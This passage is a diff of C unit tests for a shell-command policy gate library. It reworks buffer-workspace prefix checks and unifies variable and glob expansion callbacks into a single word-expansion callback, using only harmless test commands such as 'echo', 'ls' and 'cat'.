@@ -6,11 +6,13 @@
 #include "sg_anomaly.h"
 #include "shell_abstract.h"
 #include "shell_depgraph.h"
+#include "shell_netstring.h"
 #include "shell_processor.h"
 #include "shell_sequence.h"
 #include "shell_tokenizer.h"
 #include "shellgate.h"
 #include "test_allocator.h"
+#include "test_eval_buffer.h"
 #include "test_io.h"
 #include "test_numeric_locale.h"
 #include "test_sg_failures.h"
@@ -214,10 +216,11 @@ static sg_error_t eval_cmd(sg_gate_t *g, const char *cmd, sg_result_t *r) {
 /* Reserve the evaluator's aligned depgraph tail while constraining only the
  * result-string prefix. This keeps truncation tests about diagnostics rather
  * than accidentally testing the separate workspace contract. */
-static size_t eval_buffer_size_for_prefix(size_t prefix_size) {
-  size_t workspace_size = 0;
+static size_t eval_buffer_size_for_prefix(const char *command,
+                                          size_t prefix_size) {
+  size_t workspace_size = sg_test_eval_workspace_size(strlen(command));
   size_t alignment = shell_dep_workspace_alignment();
-  if (!shell_dep_workspace_size(NULL, &workspace_size) || alignment == 0)
+  if (workspace_size == 0)
     return 0;
   uintptr_t begin = (uintptr_t)(void *)eval_buf;
   if (prefix_size > UINTPTR_MAX - begin)
@@ -234,38 +237,31 @@ static size_t eval_buffer_size_for_prefix(size_t prefix_size) {
 
 /* Mirror only the public workspace-placement contract so boundary tests can
  * prove graph-backed result fields do not escape into the private tail. */
-static size_t eval_result_prefix_size(size_t buffer_size) {
-  size_t workspace_size = 0;
-  size_t alignment = shell_dep_workspace_alignment();
-  if (buffer_size == 0 || !shell_dep_workspace_size(NULL, &workspace_size) ||
-      alignment == 0 || workspace_size > buffer_size)
-    return 0;
-  uintptr_t begin = (uintptr_t)(void *)eval_buf;
-  if (buffer_size > UINTPTR_MAX - begin)
-    return 0;
-  uintptr_t start = begin + buffer_size - workspace_size;
-  uintptr_t padding = start % alignment;
-  if (padding > start || start - padding < begin)
-    return 0;
-  start -= padding;
-  return start == begin ? 0 : (size_t)(start - begin);
+static size_t eval_result_prefix_size(const char *command, size_t buffer_size) {
+  return sg_test_eval_prefix_size(eval_buf, buffer_size, strlen(command));
 }
 
-static bool result_string_in_prefix(const char *value, size_t prefix_size) {
+/* buffer references prefix_size readable bytes. Missing optional result
+ * strings are NULL; a missing byte span is NULL only with length zero. */
+static SHELL_NONNULL(2) bool result_string_in_prefix(const char *value,
+                                                     const char *buffer,
+                                                     size_t prefix_size) {
   if (!value)
     return true;
-  uintptr_t begin = (uintptr_t)(void *)eval_buf;
+  uintptr_t begin = (uintptr_t)(const void *)buffer;
   uintptr_t address = (uintptr_t)(void *)value;
   if (address < begin || address - begin >= prefix_size)
     return false;
   return memchr(value, '\0', prefix_size - (size_t)(address - begin)) != NULL;
 }
 
-static bool result_span_in_prefix(const char *value, size_t length,
-                                  size_t prefix_size) {
+static SHELL_NONNULL(3) bool result_span_in_prefix(const char *value,
+                                                   size_t length,
+                                                   const char *buffer,
+                                                   size_t prefix_size) {
   if (!value)
     return length == 0;
-  uintptr_t begin = (uintptr_t)(void *)eval_buf;
+  uintptr_t begin = (uintptr_t)(const void *)buffer;
   uintptr_t address = (uintptr_t)(void *)value;
   if (address < begin || address - begin > prefix_size)
     return false;
@@ -275,35 +271,44 @@ static bool result_span_in_prefix(const char *value, size_t length,
 /* The depgraph workspace occupies the buffer tail after graph construction.
  * Every public result pointer must stay in the prefix; this checks every
  * distinct string-bearing result field rather than only command/netargv. */
-static bool result_fields_stay_in_prefix(const sg_result_t *result,
-                                         size_t prefix_size) {
-  if (!result || !result_string_in_prefix(result->deny_reason, prefix_size))
+static SHELL_NONNULL(1, 2) bool result_fields_stay_in_buffer(
+    const sg_result_t *result, const char *buffer, size_t prefix_size) {
+  if (!result_string_in_prefix(result->deny_reason, buffer, prefix_size))
     return false;
   for (uint32_t i = 0; i < result->subcommand_count; i++) {
     const sg_subcommand_result_t *subcommand = &result->subcommands[i];
-    if (!result_string_in_prefix(subcommand->display_command, prefix_size) ||
-        !result_string_in_prefix(subcommand->reject_reason, prefix_size) ||
+    if (!result_string_in_prefix(subcommand->display_command, buffer,
+                                 prefix_size) ||
+        !result_string_in_prefix(subcommand->reject_reason, buffer,
+                                 prefix_size) ||
         !result_span_in_prefix(subcommand->netargv, subcommand->netargv_length,
-                               prefix_size))
+                               buffer, prefix_size))
       return false;
   }
   for (uint32_t i = 0; i < result->suggestion_count; i++)
-    if (!result_string_in_prefix(result->suggestions[i], prefix_size))
+    if (!result_string_in_prefix(result->suggestions[i], buffer, prefix_size))
       return false;
   for (uint32_t i = 0; i < result->deny_suggestion_count; i++)
-    if (!result_string_in_prefix(result->deny_suggestions[i], prefix_size))
+    if (!result_string_in_prefix(result->deny_suggestions[i], buffer,
+                                 prefix_size))
       return false;
   for (uint32_t i = 0; i < result->violation_count; i++)
-    if (!result_string_in_prefix(result->violations[i].description,
+    if (!result_string_in_prefix(result->violations[i].description, buffer,
                                  prefix_size) ||
-        !result_string_in_prefix(result->violations[i].detail, prefix_size))
+        !result_string_in_prefix(result->violations[i].detail, buffer,
+                                 prefix_size))
       return false;
   return true;
 }
 
+static SHELL_NONNULL(1) bool result_fields_stay_in_prefix(
+    const sg_result_t *result, size_t prefix_size) {
+  return result_fields_stay_in_buffer(result, eval_buf, prefix_size);
+}
+
 static sg_error_t eval_with_prefix(sg_gate_t *gate, const char *command,
                                    size_t prefix_size, sg_result_t *result) {
-  size_t buffer_size = eval_buffer_size_for_prefix(prefix_size);
+  size_t buffer_size = eval_buffer_size_for_prefix(command, prefix_size);
   if (buffer_size == 0)
     return SG_ERR_MEMORY;
   memset(eval_buf, 0, buffer_size);
@@ -495,8 +500,7 @@ TEST(setter_matrix) {
     ASSERT(sg_gate_set_reject_mask(g, masks[i]) == SG_OK);
   ASSERT(sg_gate_set_suggestions(g, true) == SG_OK);
   ASSERT(sg_gate_set_suggestions(g, false) == SG_OK);
-  ASSERT(sg_gate_set_expand_var_netargv(g, NULL, NULL) == SG_OK);
-  ASSERT(sg_gate_set_expand_glob_netargv(g, NULL, NULL) == SG_OK);
+  ASSERT(sg_gate_set_expand_word_netargv(g, NULL, NULL) == SG_OK);
   sg_violation_config_t config;
   sg_violation_config_default(&config);
   ASSERT(sg_gate_set_violation_config_borrowed(g, &config) == SG_OK);
@@ -5817,6 +5821,84 @@ TEST(policy_persistence_matrix) {
 
 /* --- BUFFER MANAGEMENT --- */
 
+TEST(eval_workspace_prefix_boundaries) {
+  static const size_t lengths[] = {11, 64, 4096};
+  sg_gate_t *gate = sg_gate_new();
+  ASSERT(gate != NULL);
+  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
+  ASSERT_SG_OK(sg_gate_set_suggestions(gate, false));
+  char source[4097];
+  size_t alignment = shell_dep_workspace_alignment();
+  ASSERT(sg_test_eval_workspace_size(SIZE_MAX) == 0);
+  for (size_t i = 0; i < sizeof(lengths) / sizeof(lengths[0]); i++) {
+    size_t length = lengths[i];
+    memset(source, ' ', length);
+    memcpy(source, "echo $VALUE", 11);
+    source[length] = 0;
+    size_t hint = sg_gate_evaluate_size_hint(length);
+    size_t workspace = sg_test_eval_workspace_size(length);
+    ASSERT(workspace != 0 && hint + alignment + 7 < sizeof(eval_buf));
+    for (size_t offset = 0; offset < alignment; offset++) {
+      char *buffer = eval_buf + offset;
+      const size_t capacities[] = {workspace - 1, workspace,
+                                   workspace + alignment,
+                                   workspace + 128 + alignment - 1};
+      const sg_error_t errors[] = {SG_ERR_MEMORY, SG_ERR_MEMORY, SG_ERR_TRUNC,
+                                   SG_OK};
+      for (size_t boundary = 0; boundary < 4; boundary++) {
+        size_t size = capacities[boundary];
+        size_t prefix = sg_test_eval_prefix_size(buffer, size, length);
+        sg_result_t result = {0};
+        ASSERT(sg_gate_evaluate(gate, source, length, buffer, size, &result) ==
+               errors[boundary]);
+        ASSERT(result.verdict == SG_VERDICT_UNDETERMINED);
+        if (boundary < 2) {
+          ASSERT(prefix == 0 && !result.truncated &&
+                 result.subcommand_count == 0 &&
+                 result.unresolved_expansion_flags == 0);
+          ASSERT_STR(result.deny_reason, "depgraph workspace unavailable");
+        } else {
+          ASSERT(prefix > 0 && result.subcommand_count == 1 &&
+                 result.truncated == (boundary == 2) &&
+                 result.unresolved_expansion_flags ==
+                     SG_EXPANSION_UNRESOLVED_ARGV &&
+                 result.subcommands[0].unresolved_expansion_flags ==
+                     SG_EXPANSION_UNRESOLVED_ARGV);
+          ASSERT(result_fields_stay_in_buffer(&result, buffer, prefix));
+        }
+      }
+      for (size_t extra = 0; extra <= 7; extra += 7) {
+        size_t size = hint + extra;
+        size_t prefix = sg_test_eval_prefix_size(buffer, size, length);
+        ASSERT(prefix != 0 && prefix + workspace <= size);
+        ASSERT(((uintptr_t)(buffer + prefix) % alignment) == 0);
+        ASSERT(size - prefix - workspace < alignment);
+        ASSERT(sg_test_eval_prefix_size(buffer, workspace - 1, length) == 0);
+        sg_result_t result = {0};
+        ASSERT_SG_OK(
+            sg_gate_evaluate(gate, source, length, buffer, size, &result));
+        ASSERT(result.subcommand_count == 1);
+        uintptr_t argument = (uintptr_t)result.subcommands[0].netargv;
+        ASSERT(argument >= (uintptr_t)buffer &&
+               argument - (uintptr_t)buffer < prefix &&
+               result.subcommands[0].netargv_length <=
+                   prefix - (size_t)(argument - (uintptr_t)buffer));
+        ASSERT(result_fields_stay_in_buffer(&result, buffer, prefix));
+        if (offset == 0) {
+          ASSERT(result_fields_stay_in_prefix(&result, prefix));
+          /* Exercise the checker itself, not only valid production results. */
+          buffer[prefix - 1] = buffer[prefix] = 0;
+          result.deny_reason = buffer + prefix - 1;
+          ASSERT(result_fields_stay_in_prefix(&result, prefix));
+          result.deny_reason = buffer + prefix;
+          ASSERT(!result_fields_stay_in_prefix(&result, prefix));
+        }
+      }
+    }
+  }
+  sg_gate_free(gate);
+}
+
 TEST(buffer_contract_matrix) {
   static const struct {
     const char *command;
@@ -5840,9 +5922,10 @@ TEST(buffer_contract_matrix) {
   /* Early feature rejections run before workspace partitioning. The complete
    * caller buffer is available even when the capacity was constructed with a
    * deliberately tiny hypothetical graph-result prefix. */
-  size_t early_feature_buffer_size = eval_buffer_size_for_prefix(4);
+  size_t early_feature_buffer_size =
+      eval_buffer_size_for_prefix("echo $VALUE", 4);
   size_t early_feature_prefix =
-      eval_result_prefix_size(early_feature_buffer_size);
+      eval_result_prefix_size("echo $VALUE", early_feature_buffer_size);
   ASSERT(early_feature_buffer_size != 0 && early_feature_prefix != 0);
   ASSERT_SG_OK(sg_gate_set_reject_mask(g, SHELL_FEAT_VARS));
   ASSERT(eval_with_prefix(g, "echo $VALUE", 4, &feature_result) == SG_OK);
@@ -5870,9 +5953,9 @@ TEST(buffer_contract_matrix) {
    * evaluator needs at least one byte in its result prefix.  Align this test
    * buffer explicitly so its exact size reaches that boundary on every
    * supported allocator. */
-  size_t workspace_size = 0;
+  size_t workspace_size = sg_test_eval_workspace_size(2);
   size_t workspace_alignment = shell_dep_workspace_alignment();
-  ASSERT(shell_dep_workspace_size(NULL, &workspace_size));
+  ASSERT(workspace_size != 0);
   ASSERT(workspace_alignment != 0);
   ASSERT(workspace_size <= SIZE_MAX - workspace_alignment);
   char *exact_workspace_raw = malloc(workspace_size + workspace_alignment);
@@ -5981,13 +6064,14 @@ TEST(buffer_contract_matrix) {
     cmd[len++] = 'l';
     cmd[len++] = 's';
   }
+  cmd[len] = '\0';
   ASSERT(eval_with_prefix(g, cmd, 4096, &result) == SG_ERR_TRUNC);
   ASSERT(result.subcommand_count == SG_MAX_SUBCOMMAND_RESULTS);
   ASSERT(result.truncated);
   ASSERT(result.subcommand_truncated);
 
-  size_t graph_buffer_size = eval_buffer_size_for_prefix(32);
-  size_t graph_result_prefix = eval_result_prefix_size(graph_buffer_size);
+  size_t graph_buffer_size = eval_buffer_size_for_prefix("ls", 32);
+  size_t graph_result_prefix = eval_result_prefix_size("ls", graph_buffer_size);
   ASSERT(graph_buffer_size != 0 && graph_result_prefix != 0);
   memset(eval_buf, 0xFF, sizeof(eval_buf));
   ASSERT(eval_with_prefix(g, "ls", 32, &result) == SG_OK);
@@ -6105,8 +6189,8 @@ TEST(buffer_contract_matrix) {
 TEST(graph_result_fields_stay_out_of_workspace) {
   static const char *const allow_rules[] = {"ls", "cat #path", "echo *"};
   const size_t requested_prefix = 2048;
-  size_t buffer_size = eval_buffer_size_for_prefix(requested_prefix);
-  size_t result_prefix = eval_result_prefix_size(buffer_size);
+  size_t buffer_size = eval_buffer_size_for_prefix("ls", requested_prefix);
+  size_t result_prefix = eval_result_prefix_size("ls", buffer_size);
   ASSERT(buffer_size != 0 && result_prefix >= requested_prefix);
 
   sg_gate_t *gate = gate_with_rules(allow_rules, sizeof(allow_rules) /
@@ -6127,12 +6211,18 @@ TEST(graph_result_fields_stay_out_of_workspace) {
          result_fields_stay_in_prefix(&result, result_prefix));
 
   ASSERT(eval_with_prefix(gate, "blocked", requested_prefix, &result) == SG_OK);
+  buffer_size = eval_buffer_size_for_prefix("blocked", requested_prefix);
+  result_prefix = eval_result_prefix_size("blocked", buffer_size);
   ASSERT(result.verdict == SG_VERDICT_DENY &&
          result.subcommands[0].reject_reason != NULL &&
          result_fields_stay_in_prefix(&result, result_prefix));
 
   ASSERT(eval_with_prefix(gate, "echo data > /workspace/result-prefix",
                           requested_prefix, &result) == SG_OK);
+  buffer_size = eval_buffer_size_for_prefix(
+      "echo data > /workspace/result-prefix", requested_prefix);
+  result_prefix = eval_result_prefix_size(
+      "echo data > /workspace/result-prefix", buffer_size);
   ASSERT(result.has_violations && result.violation_count > 0 &&
          result_fields_stay_in_prefix(&result, result_prefix));
 
@@ -6141,8 +6231,10 @@ TEST(graph_result_fields_stay_out_of_workspace) {
   bool saw_graph_truncation = false;
   bool saw_retained_graph_result = false;
   for (size_t prefix = 1; prefix <= 256; prefix++) {
-    size_t buffer_size = eval_buffer_size_for_prefix(prefix);
-    size_t result_prefix = eval_result_prefix_size(buffer_size);
+    size_t buffer_size = eval_buffer_size_for_prefix(
+        "echo data > /workspace/result-prefix", prefix);
+    size_t result_prefix = eval_result_prefix_size(
+        "echo data > /workspace/result-prefix", buffer_size);
     ASSERT(buffer_size != 0 && result_prefix != 0);
     sg_error_t error = eval_with_prefix(
         gate, "echo data > /workspace/result-prefix", prefix, &result);
@@ -6381,12 +6473,10 @@ TEST(contextual_policy_mutations_preserve_verdicts) {
 
 /* --- EXPANSION CALLBACKS --- */
 
-static sg_expand_status_t expand_canonical_cstr(const char *name,
-                                                size_t name_length,
-                                                const char **netargv,
-                                                size_t *length, void *ctx) {
-  (void)name;
-  (void)name_length;
+static sg_expand_status_t
+expand_canonical_cstr(const sg_expand_word_request_t *request,
+                      const char **netargv, size_t *length, void *ctx) {
+  (void)request;
   const char *encoded = ctx;
   if (!encoded)
     return SG_EXPAND_UNRESOLVED;
@@ -6395,31 +6485,31 @@ static sg_expand_status_t expand_canonical_cstr(const char *name,
   return SG_EXPAND_RESOLVED;
 }
 
-static sg_expand_status_t expand_home_canonical(const char *name,
-                                                size_t name_length,
-                                                const char **netargv,
-                                                size_t *length, void *ctx) {
-  return name_length == 4 && memcmp(name, "HOME", 4) == 0
-             ? expand_canonical_cstr(name, name_length, netargv, length, ctx)
-             : SG_EXPAND_UNRESOLVED;
+static sg_expand_status_t
+expand_home_canonical(const sg_expand_word_request_t *request,
+                      const char **netargv, size_t *length, void *ctx) {
+  const char *word = request->source + request->word_offset;
+  size_t word_length = request->word_length;
+  bool home = (word_length == 5 && memcmp(word, "$HOME", 5) == 0) ||
+              (word_length == 7 && memcmp(word, "${HOME}", 7) == 0);
+  return home ? expand_canonical_cstr(request, netargv, length, ctx)
+              : SG_EXPAND_UNRESOLVED;
 }
 
-static sg_expand_status_t expand_txt_canonical(const char *pattern,
-                                               size_t pattern_length,
-                                               const char **netargv,
-                                               size_t *length, void *ctx) {
+static sg_expand_status_t
+expand_txt_canonical(const sg_expand_word_request_t *request,
+                     const char **netargv, size_t *length, void *ctx) {
+  const char *pattern = request->source + request->word_offset;
+  size_t pattern_length = request->word_length;
   return pattern_length == 5 && memcmp(pattern, "*.txt", 5) == 0
-             ? expand_canonical_cstr(pattern, pattern_length, netargv, length,
-                                     ctx)
+             ? expand_canonical_cstr(request, netargv, length, ctx)
              : SG_EXPAND_UNRESOLVED;
 }
 
-static sg_expand_status_t expand_invalid_canonical(const char *name,
-                                                   size_t name_length,
-                                                   const char **netargv,
-                                                   size_t *length, void *ctx) {
-  (void)name;
-  (void)name_length;
+static sg_expand_status_t
+expand_invalid_canonical(const sg_expand_word_request_t *request,
+                         const char **netargv, size_t *length, void *ctx) {
+  (void)request;
   (void)ctx;
   *netargv = NULL;
   *length = 0;
@@ -6455,10 +6545,10 @@ TEST(expansion_callback_matrix) {
     ASSERT(g != NULL);
     ASSERT_SG_OK(sg_gate_add_allow_cpl(g, cases[i].rule));
     if (cases[i].kind == EXPAND_VARIABLE)
-      ASSERT_SG_OK(sg_gate_set_expand_var_netargv(g, expand_home_canonical,
-                                                  cases[i].context));
+      ASSERT_SG_OK(sg_gate_set_expand_word_netargv(g, expand_home_canonical,
+                                                   cases[i].context));
     else if (cases[i].kind == EXPAND_GLOB)
-      ASSERT_SG_OK(sg_gate_set_expand_glob_netargv(g, expand_txt_canonical,
+      ASSERT_SG_OK(sg_gate_set_expand_word_netargv(g, expand_txt_canonical,
                                                    cases[i].context));
 
     sg_result_t result;
@@ -6472,7 +6562,7 @@ TEST(expansion_callback_matrix) {
   sg_gate_t *canonical = sg_gate_new();
   ASSERT(canonical != NULL);
   ASSERT_SG_OK(sg_gate_add_allow_cpl(canonical, "cat #f #f"));
-  ASSERT_SG_OK(sg_gate_set_expand_glob_netargv(canonical, expand_canonical_cstr,
+  ASSERT_SG_OK(sg_gate_set_expand_word_netargv(canonical, expand_canonical_cstr,
                                                "7:one.txt,7:two.txt,"));
   sg_result_t result;
   ASSERT_SG_OK(eval_cmd(canonical, "cat *.txt", &result));
@@ -6483,7 +6573,7 @@ TEST(expansion_callback_matrix) {
   canonical = sg_gate_new();
   ASSERT(canonical != NULL);
   ASSERT_SG_OK(sg_gate_add_allow_cpl(canonical, "cat hit hit"));
-  ASSERT_SG_OK(sg_gate_set_expand_glob_netargv(canonical, expand_canonical_cstr,
+  ASSERT_SG_OK(sg_gate_set_expand_word_netargv(canonical, expand_canonical_cstr,
                                                "3:hit,"));
   ASSERT_SG_OK(eval_cmd(canonical, "cat ?.txt [ab].txt", &result));
   ASSERT(result.verdict == SG_VERDICT_ALLOW);
@@ -6493,8 +6583,8 @@ TEST(expansion_callback_matrix) {
   canonical = sg_gate_new();
   ASSERT(canonical != NULL);
   ASSERT_SG_OK(sg_gate_add_allow_cpl(canonical, "echo \"two words\""));
-  ASSERT_SG_OK(sg_gate_set_expand_var_netargv(canonical, expand_canonical_cstr,
-                                              "9:two words,"));
+  ASSERT_SG_OK(sg_gate_set_expand_word_netargv(canonical, expand_canonical_cstr,
+                                               "9:two words,"));
   ASSERT_SG_OK(eval_cmd(canonical, "echo $VALUE", &result));
   ASSERT(result.verdict == SG_VERDICT_ALLOW);
   ASSERT_STR(result.subcommands[0].netargv, "4:echo,9:two words,");
@@ -6508,32 +6598,31 @@ TEST(expansion_callback_matrix) {
   canonical = sg_gate_new();
   ASSERT(canonical != NULL);
   ASSERT_SG_OK(sg_gate_add_allow_cpl(canonical, "echo value value value"));
-  ASSERT_SG_OK(sg_gate_set_expand_var_netargv(canonical, expand_canonical_cstr,
-                                              "5:value,"));
+  ASSERT_SG_OK(sg_gate_set_expand_word_netargv(canonical, expand_canonical_cstr,
+                                               "5:value,"));
   ASSERT_SG_OK(eval_cmd(canonical, "echo ${UPPER} ${A1} ${_}", &result));
   ASSERT(result.verdict == SG_VERDICT_ALLOW);
   ASSERT_STR(result.subcommands[0].netargv, "4:echo,5:value,5:value,5:value,");
   sg_gate_free(canonical);
 
-  /* A lone dollar and Bash special-parameter spelling are not application
-   * variable identifiers. Keep them literal instead of invoking the named
-   * variable callback with an empty or punctuation-bearing name. */
+  /* A lone dollar is static text. A special parameter is a dynamic whole
+   * source word and therefore reaches the application callback unchanged. */
   canonical = sg_gate_new();
   ASSERT(canonical != NULL);
   ASSERT_SG_OK(sg_gate_set_reject_mask(canonical, 0));
-  ASSERT_SG_OK(sg_gate_set_expand_var_netargv(canonical, expand_canonical_cstr,
-                                              "5:value,"));
+  ASSERT_SG_OK(sg_gate_set_expand_word_netargv(canonical, expand_canonical_cstr,
+                                               "5:value,"));
   ASSERT_SG_OK(eval_cmd(canonical, "echo $", &result));
   ASSERT_STR(result.subcommands[0].netargv, "4:echo,1:$,");
   ASSERT_SG_OK(eval_cmd(canonical, "echo $-", &result));
-  ASSERT_STR(result.subcommands[0].netargv, "4:echo,2:$-,");
+  ASSERT_STR(result.subcommands[0].netargv, "4:echo,5:value,");
   sg_gate_free(canonical);
 
   canonical = sg_gate_new();
   ASSERT(canonical != NULL);
   ASSERT_SG_OK(sg_gate_add_allow_cpl(canonical, "echo tail"));
   ASSERT_SG_OK(
-      sg_gate_set_expand_var_netargv(canonical, expand_canonical_cstr, ""));
+      sg_gate_set_expand_word_netargv(canonical, expand_canonical_cstr, ""));
   ASSERT_SG_OK(eval_cmd(canonical, "echo $DROP tail", &result));
   ASSERT(result.verdict == SG_VERDICT_ALLOW);
   ASSERT_STR(result.subcommands[0].netargv, "4:echo,4:tail,");
@@ -6543,7 +6632,7 @@ TEST(expansion_callback_matrix) {
   ASSERT(canonical != NULL);
   ASSERT_SG_OK(sg_gate_add_allow_cpl(canonical, "echo \"\" tail"));
   ASSERT_SG_OK(
-      sg_gate_set_expand_var_netargv(canonical, expand_canonical_cstr, "0:,"));
+      sg_gate_set_expand_word_netargv(canonical, expand_canonical_cstr, "0:,"));
   ASSERT_SG_OK(eval_cmd(canonical, "echo $EMPTY tail", &result));
   ASSERT_STR(result.subcommands[0].netargv, "4:echo,0:,4:tail,");
   ASSERT(result.verdict == SG_VERDICT_ALLOW);
@@ -6551,15 +6640,15 @@ TEST(expansion_callback_matrix) {
 
   canonical = sg_gate_new();
   ASSERT(canonical != NULL);
-  ASSERT_SG_OK(sg_gate_set_expand_var_netargv(canonical, expand_canonical_cstr,
-                                              "3:bad"));
+  ASSERT_SG_OK(sg_gate_set_expand_word_netargv(canonical, expand_canonical_cstr,
+                                               "3:bad"));
   ASSERT(eval_cmd(canonical, "echo $BAD", &result) == SG_ERR_EXPAND);
   sg_gate_free(canonical);
 
   canonical = sg_gate_new();
   ASSERT(canonical != NULL);
-  ASSERT_SG_OK(sg_gate_set_expand_var_netargv(canonical,
-                                              expand_invalid_canonical, NULL));
+  ASSERT_SG_OK(sg_gate_set_expand_word_netargv(canonical,
+                                               expand_invalid_canonical, NULL));
   ASSERT(eval_cmd(canonical, "echo $BAD", &result) == SG_ERR_EXPAND);
   sg_gate_free(canonical);
 }
@@ -6571,9 +6660,12 @@ typedef struct {
 } expansion_query_capture_t;
 
 static sg_expand_status_t
-capture_expansion_query(const char *query, size_t length, const char **netargv,
-                        size_t *netargv_length, void *context) {
+capture_expansion_query(const sg_expand_word_request_t *request,
+                        const char **netargv, size_t *netargv_length,
+                        void *context) {
   expansion_query_capture_t *capture = context;
+  const char *query = request->source + request->word_offset;
+  size_t length = request->word_length;
   capture->calls++;
   capture->matched = length == strlen(capture->expected) &&
                      memcmp(query, capture->expected, length) == 0;
@@ -6585,36 +6677,35 @@ capture_expansion_query(const char *query, size_t length, const char **netargv,
 TEST(expansion_query_semantics) {
   static const struct {
     const char *word;
-    bool variable;
     const char *query;
     const char *netargv;
   } cases[] = {
-      {"*.txt", false, "*.txt", "4:echo,3:hit,"},
-      {"'*.txt'", false, NULL, "4:echo,5:*.txt,"},
-      {"\"*.txt\"", false, NULL, "4:echo,5:*.txt,"},
-      {"\\*.txt", false, NULL, "4:echo,5:*.txt,"},
-      {"$'*.txt'", false, NULL, "4:echo,5:*.txt,"},
-      {"pre\"*\"post", false, NULL, "4:echo,8:pre*post,"},
-      {"pre\\*post", false, NULL, "4:echo,8:pre*post,"},
-      {"pre\"[ab]\"post", false, NULL, "4:echo,11:pre[ab]post,"},
-      {"pre\\*post?", false, "pre\\*post?", "4:echo,3:hit,"},
-      {"'a'*'b'", false, "'a'*'b'", "4:echo,3:hit,"},
-      {"[", false, NULL, "4:echo,1:[,"},
-      {"[$'ab']", false, "[$'ab']", "4:echo,3:hit,"},
-      {"[$'']", false, NULL, "4:echo,2:[],"},
-      {"pre@(left|right)", false, "pre@(left|right)", "4:echo,3:hit,"},
-      {"$NAME", true, "NAME", "4:echo,3:hit,"},
-      {"${NAME}", true, "NAME", "4:echo,3:hit,"},
-      {"$1", true, "1", "4:echo,3:hit,"},
-      {"${12}", true, "12", "4:echo,3:hit,"},
-      {"$12", true, NULL, "4:echo,3:$12,"},
-      {"$1abc", true, NULL, "4:echo,5:$1abc,"},
-      {"pre$NAME", true, NULL, "4:echo,8:pre$NAME,"},
-      {"${NAME}post", true, NULL, "4:echo,11:${NAME}post,"},
-      {"\"$NAME\"", true, NULL, "4:echo,5:$NAME,"},
-      {"$?", true, NULL, "4:echo,2:$?,"},
-      {"${NAME:-value}", true, NULL, "4:echo,14:${NAME:-value},"},
-      {"$NA\\\nME", true, NULL, "4:echo,5:$NAME,"},
+      {"*.txt", "*.txt", "4:echo,3:hit,"},
+      {"'*.txt'", NULL, "4:echo,5:*.txt,"},
+      {"\"*.txt\"", NULL, "4:echo,5:*.txt,"},
+      {"\\*.txt", NULL, "4:echo,5:*.txt,"},
+      {"$'*.txt'", NULL, "4:echo,5:*.txt,"},
+      {"pre\"*\"post", NULL, "4:echo,8:pre*post,"},
+      {"pre\\*post", NULL, "4:echo,8:pre*post,"},
+      {"pre\"[ab]\"post", NULL, "4:echo,11:pre[ab]post,"},
+      {"pre\\*post?", "pre\\*post?", "4:echo,3:hit,"},
+      {"'a'*'b'", "'a'*'b'", "4:echo,3:hit,"},
+      {"[", NULL, "4:echo,1:[,"},
+      {"[$'ab']", "[$'ab']", "4:echo,3:hit,"},
+      {"[$'']", NULL, "4:echo,2:[],"},
+      {"pre@(left|right)", "pre@(left|right)", "4:echo,3:hit,"},
+      {"$NAME", "$NAME", "4:echo,3:hit,"},
+      {"${NAME}", "${NAME}", "4:echo,3:hit,"},
+      {"$1", "$1", "4:echo,3:hit,"},
+      {"${12}", "${12}", "4:echo,3:hit,"},
+      {"$12", "$12", "4:echo,3:hit,"},
+      {"$1abc", "$1abc", "4:echo,3:hit,"},
+      {"pre$NAME", "pre$NAME", "4:echo,3:hit,"},
+      {"${NAME}post", "${NAME}post", "4:echo,3:hit,"},
+      {"\"$NAME\"", "\"$NAME\"", "4:echo,3:hit,"},
+      {"$?", "$?", "4:echo,3:hit,"},
+      {"${NAME:-value}", "${NAME:-value}", "4:echo,3:hit,"},
+      {"$NA\\\nME", "$NA\\\nME", "4:echo,3:hit,"},
   };
   for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
     sg_gate_t *gate = sg_gate_new();
@@ -6622,12 +6713,8 @@ TEST(expansion_query_semantics) {
     expansion_query_capture_t capture = {
         .expected = cases[i].query ? cases[i].query : "unexpected",
     };
-    if (cases[i].variable)
-      ASSERT_SG_OK(sg_gate_set_expand_var_netargv(gate, capture_expansion_query,
-                                                  &capture));
-    else
-      ASSERT_SG_OK(sg_gate_set_expand_glob_netargv(
-          gate, capture_expansion_query, &capture));
+    ASSERT_SG_OK(sg_gate_set_expand_word_netargv(gate, capture_expansion_query,
+                                                 &capture));
     ASSERT_SG_OK(sg_gate_add_allow_cpl(gate, "echo *"));
     ASSERT_SG_OK(sg_gate_set_suggestions(gate, false));
     char source[256];
@@ -6645,17 +6732,32 @@ TEST(expansion_query_semantics) {
   }
 }
 
+TEST(expansion_rejection_precedes_callback) {
+  expansion_query_capture_t capture = {.expected = "unexpected"};
+  sg_gate_t *gate = sg_gate_new();
+  ASSERT(gate != NULL);
+  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
+  ASSERT_SG_OK(
+      sg_gate_set_expand_word_netargv(gate, capture_expansion_query, &capture));
+  sg_result_t result = {0};
+  ASSERT(eval_cmd(gate, "echo ${!NAME}", &result) == SG_ERR_PARSE);
+  ASSERT(result.verdict == SG_VERDICT_REJECT && capture.calls == 0);
+
+  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, SHELL_FEAT_ARITH));
+  ASSERT_SG_OK(eval_cmd(gate, "echo $((1 + 1))", &result));
+  ASSERT(result.verdict == SG_VERDICT_REJECT && capture.calls == 0);
+  sg_gate_free(gate);
+}
+
 struct expansion_view {
   const char *netargv;
   size_t length;
 };
 
-static sg_expand_status_t expand_requested_length(const char *name,
-                                                  size_t name_length,
-                                                  const char **netargv,
-                                                  size_t *length, void *ctx) {
-  (void)name;
-  (void)name_length;
+static sg_expand_status_t
+expand_requested_length(const sg_expand_word_request_t *request,
+                        const char **netargv, size_t *length, void *ctx) {
+  (void)request;
   const struct expansion_view *view = ctx;
   *netargv = view->netargv;
   *length = view->length;
@@ -6663,7 +6765,7 @@ static sg_expand_status_t expand_requested_length(const char *name,
 }
 
 /* Callback-produced netargv is a byte span, unlike the C-string fixtures
- * above. Exercise the variable and glob callbacks with a payload that cannot
+ * above. Exercise distinct dynamic spellings with a payload that cannot
  * survive accidental strlen()-based handling. */
 TEST(binary_expansion_callback_contract) {
   static const unsigned char expansion[] = {
@@ -6672,12 +6774,9 @@ TEST(binary_expansion_callback_contract) {
   static const unsigned char expected_netargv[] = {
       '4', ':', 'e', 'c', 'h', 'o', ',', '3', ':', 'a', '\0', 'b', ',',
   };
-  static const struct {
-    const char *input;
-    bool glob;
-  } cases[] = {
